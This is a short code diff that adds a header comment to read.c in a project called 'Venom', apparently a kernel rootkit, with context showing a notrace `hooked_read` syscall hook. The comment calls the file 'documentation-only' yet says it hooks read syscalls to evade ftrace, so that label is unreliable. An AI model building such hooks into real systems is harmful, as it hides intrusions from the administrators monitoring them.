@@ -1,3 +1,21 @@
+/*
+ * Venom 
+ * ---------------------------------------------------------------------------
+ * File: read.c
+ *
+ * Purpose:
+ *  - High-level notes on the read(2) syscall path and how interception or
+ *    sanitisation of reads can change host-observable behavior (files,
+ *    /proc, sockets, pipes).
+ *
+ * Contents (documentation-only):
+ *  - Hooks read syscalls to prevent ftrace bypasses
+ * 
+ * Author: Trevohack 
+ */
+
+
+
 #ifndef READ_H
 #define READ_H
 
@@ -63,3 +81,4 @@ notrace static asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
 }
 
 #endif 
+
